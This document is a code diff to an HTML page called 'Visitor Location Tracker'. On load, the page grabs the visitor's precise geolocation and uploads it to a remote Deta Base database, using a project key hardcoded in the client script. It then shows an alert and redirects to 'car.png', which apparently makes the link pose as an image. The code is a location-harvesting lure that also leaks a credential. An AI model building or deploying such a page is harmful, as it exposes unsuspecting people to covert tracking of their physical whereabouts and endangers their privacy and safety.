@@ -7,12 +7,51 @@
 </head>
 <body>
     <h1>Welcome to Visitor Location Tracker</h1>
+    
+    <!-- Include the Deta SDK using module syntax -->
+    <script type="module">
+        // Import the Deta Base module
+        import { Base } from 'https://cdn.deta.space/js/deta@latest/deta.mjs';
 
-    <!-- Include the JavaScript file -->
-    <script src="locationTracker.js"></script>
+        // Initialize Deta Base with your project key and database name
+        const deta = Base('d0wnfstadsw_5RpqNBcY9k8wnBBfouQUXteXM6JRX546');
+        const db = deta.Base('Location');
 
-    <script>
-        // Call the getLocation function from the external JavaScript file when the page loads
+        // Function to get the visitor's location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Function to handle errors in geolocation
+        function errorHandler(error) {
+            console.log("Error getting location:", error.message);
+        }
+
+        // Function to save the visitor's location in Deta Space database and show an alert
+        function savePosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            console.log("Latitude: " + latitude + " Longitude: " + longitude);
+
+            // Store the location data in your Deta Space database
+            db.put({ latitude: latitude, longitude: longitude })
+                .then(response => {
+                    console.log('Location data saved successfully:', response);
+                    // Show an alert
+                    alert("Location data saved successfully!");
+                    // Redirect to "car.png"
+                    window.location.replace("car.png");
+                })
+                .catch(error => {
+                    console.error('Error saving location data:', error);
+                });
+        }
+
+        // Call the getLocation function when the page loads
         window.onload = function() {
             getLocation();
         };
